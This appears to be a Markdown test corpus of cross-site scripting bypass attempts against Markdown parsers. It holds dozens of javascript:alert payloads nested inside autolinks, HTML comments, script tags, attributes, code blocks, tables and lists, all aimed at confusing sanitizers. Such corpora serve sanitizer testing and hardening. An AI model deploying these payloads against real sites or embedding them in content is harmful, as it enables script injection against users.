# Parser State Confusion Bypass Attempts

## Autolink inside raw HTML comment breaking out
<!-- This is a comment <https://example.com/![test](javascript:alert('comment-break'))> -->

## Autolink inside CDATA section breaking out
<![CDATA[Data section <https://example.com/![test](javascript:alert('cdata-break'))>]]>

## Autolink inside script tag breaking out
<script>var url = "<https://example.com/![test](javascript:alert('script-break'))>";</script>

## Autolink inside style tag breaking out
<style>body { background: url("<https://example.com/![test](javascript:alert('style-break'))>"); }</style>

## Autolink inside pre tag breaking context
<pre><https://example.com/![test](javascript:alert('pre-break'))></pre>

## Autolink inside code tag breaking context
<code><https://example.com/![test](javascript:alert('code-tag-break'))></code>

## Autolink spanning across inline code
Here is `some code <https://example.com/![test](javascript:alert('inline-code-span'))> more code`.

## Autolink spanning across fenced code blocks
```
Code block
<https://example.com/![test](javascript:alert('fenced-code-span'))>
More code
```

## Autolink spanning across indented code blocks
    Code block
    <https://example.com/![test](javascript:alert('indented-code-span'))>
    More code

## Autolink inside HTML attribute breaking out
<div title="<https://example.com/![test](javascript:alert('attr-break'))>">Content</div>

## Autolink inside quoted HTML attribute breaking out
<div title='<https://example.com/![test](javascript:alert("single-quote-break"))>'>Content</div>

## Autolink with unmatched quotes in HTML
<div title="<https://example.com/![test](javascript:alert('unmatched-quote'))>Content</div>

## Autolink breaking markdown link syntax
[Link text <https://example.com/![test](javascript:alert('link-text-break'))> more text](https://safe.com)

## Autolink breaking markdown image syntax
![Alt text <https://example.com/![test](javascript:alert('alt-text-break'))> more alt](safe.jpg)

## Autolink inside reference link definition
[ref]: <https://example.com/![test](javascript:alert('ref-def-break'))> "Title"

## Autolink inside reference link title
[ref]: https://safe.com "<https://example.com/![test](javascript:alert('ref-title-break'))>"

## Autolink with nested bracket confusion
<https://example.com/![outer ![inner](javascript:alert('nested-bracket'))> more](safe.com)>

## Autolink with escaped bracket confusion
<https://example.com/![test\]](javascript:alert('escaped-bracket'))>

## Autolink with malformed bracket nesting
<https://example.com/![test](javascript:alert('malformed')] extra>

## Autolink inside table cell breaking context
| Column 1 | Column 2 |
|----------|----------|
| <https://example.com/![test](javascript:alert('table-cell-break'))> | Safe |

## Autolink inside blockquote breaking context
> This is a quote
> <https://example.com/![test](javascript:alert('blockquote-break'))>
> More quote

## Autolink inside heading breaking context
# Heading with <https://example.com/![test](javascript:alert('heading-break'))>

## Autolink inside emphasis breaking context
*Emphasized text <https://example.com/![test](javascript:alert('em-break'))> more text*

## Autolink inside strong emphasis breaking context
**Strong text <https://example.com/![test](javascript:alert('strong-break'))> more text**

## Autolink inside strikethrough breaking context
~~Strike text <https://example.com/![test](javascript:alert('strike-break'))> more text~~

## Autolink inside list item breaking context
1. List item <https://example.com/![test](javascript:alert('list-break'))>
2. Another item

## Autolink inside nested list breaking context
1. Outer item
   - Inner item <https://example.com/![test](javascript:alert('nested-list-break'))>
   - Another inner item

## Autolink with line break in middle
<https://example.com/![test](java
script:alert('line-break-middle'))>

## Autolink with multiple line breaks
<https://example.com/

![test](javascript:alert('multi-line-break'))>

## Autolink with carriage return
<https://example.com/![test](javascript:alert('carriage-return'))>

## Autolink with form feed character
<https://example.com/![test](javascript:alert('form-feed'))>

## Autolink with vertical tab
<https://example.com/![test](javascript:alert('vtab'))>

## Autolink with multiple consecutive autolinks
<https://one.com/![a](javascript:alert('a'))><https://two.com/![b](javascript:alert('b'))>

## Autolink with adjacent markdown syntax
<https://example.com/![test](javascript:alert('adjacent'))>**bold**

## Autolink with overlapping markdown syntax
*<https://example.com/![test](javascript:alert('overlap'))>emphasis*

## Autolink inside definition list term
Term <https://example.com/![test](javascript:alert('def-term'))>
: Definition

## Autolink inside definition list definition
Term
: Definition <https://example.com/![test](javascript:alert('def-desc'))>

## Autolink with markdown inside HTML
<div><https://example.com/![test](javascript:alert('html-md-mix'))></div>

## Autolink with HTML inside markdown context
[Link with <span><https://example.com/![test](javascript:alert('md-html-mix'))></span>](safe.com)

## Autolink with malformed HTML tags
<div<https://example.com/![test](javascript:alert('malformed-tag'))>>Content</div>

## Autolink with self-closing tag confusion
<img src="safe.jpg" <https://example.com/![test](javascript:alert('self-close'))> />

## Autolink with XML namespace confusion
<ns:tag xmlns:ns="http://example.com"><https://example.com/![test](javascript:alert('xml-ns'))></ns:tag>

## Autolink with processing instruction confusion
<?xml version="1.0"?><https://example.com/![test](javascript:alert('pi-confusion'))>

## Autolink with doctype confusion
<!DOCTYPE html <https://example.com/![test](javascript:alert('doctype'))>>

## Autolink with parser fence confusion
<https://example.com/```![test](javascript:alert('fence-confusion'))```>

## Autolink with reference confusion
<https://example.com/[test][dangerous]>

[dangerous]: javascript:alert('ref-confusion')